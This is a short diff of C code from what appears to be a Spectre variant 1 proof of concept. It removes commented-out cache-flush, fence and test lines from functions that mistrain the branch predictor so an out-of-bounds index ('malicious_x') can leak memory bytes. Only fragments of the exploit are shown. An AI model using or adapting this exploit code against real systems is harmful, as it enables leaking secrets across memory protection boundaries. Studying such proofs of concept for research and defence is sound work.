@@ -65,9 +65,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
      */
     training_x = tries % *array1_size;
     for (j = 29; j >= 0; j--) {
-      // _mm_clflush(array1_size);
-      // for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
-      // _mm_mfence();
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
@@ -122,10 +119,6 @@ int main(int argc, const char **argv) {
     perror("msgget failed");
     exit(1);
   }
-
-  // *array1_size = 0;
-  // msgsnd(msgid, &(msg_buffer){0, 0}, sizeof(size_t), 0);
-  // exit(0);
 
   size_t malicious_x = 0;
   int i, score[2], len = 64;
